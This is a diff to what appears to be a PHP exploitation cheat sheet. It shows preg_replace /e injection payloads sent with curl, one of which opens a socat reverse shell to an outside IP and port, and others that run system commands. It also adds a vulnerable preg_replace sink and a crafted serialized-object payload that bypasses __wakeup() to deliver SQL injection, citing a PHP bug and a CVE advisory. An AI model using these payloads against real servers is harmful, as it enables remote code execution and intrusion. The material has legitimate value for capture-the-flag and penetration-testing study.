@@ -34,8 +34,9 @@ php -m
 http://blog.gosecure.ca/2016/04/27/binary-webshell-through-opcache-in-php-7/
 
 # preg_replace
-preg_replace($_POST["find"], $_POST["replace"], $_POST["text"]); exploit with:text=heydude&find=/dude/e&replace=`ls`
+preg_replace($_POST["find"], $_POST["replace"], $unknown); exploit with find=//e&replace=`ls`
 
+preg_replace($_GET['ville'], $_GET['ville'], urldecode($_SERVER['REQUEST_URI']));
 curl 'http://10.0.0.1/demo/preg_replace.php?ville=`socat+exec:sh+tcp:10.10.220.211:8888`/e%00'
 curl 'http://10.0.0.1/demo/preg_replace.php?ville=print+2;%23/e%00'
 curl 'http://10.0.0.1/demo/preg_replace.php?ville=%23(.*)|%0aeval($_GET\[3\]);%23/e%00&3=system(%22id%22);' 
@@ -176,6 +177,11 @@ upload blah.php:
   {$b = fgets($a); echo $b;}
   fclose($a); // or use show_source("/tmp/out.txt");
 ?>
+
+* bypass __wakeup()
+https://bugs.php.net/bug.php?id=72663
+
+requests.get('http://127.0.0.1:1234/?data=' + quote('a:2:{i:0;O:6:"HITCON":3:{s:14:"\x00HITCON\x00method";s:4:"show";s:12:"\x00HITCON\x00args";a:1:{i:0;s:17:"orange\' sqli here";}s:12:"\x00HITCON\x00conn";47:{a:1:{i:0;O:9:"Exception":2:{s:7:"\x00*\x00file";R:4;}}i:1;R:4;}'))
 
 # php-cgi
 http://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/
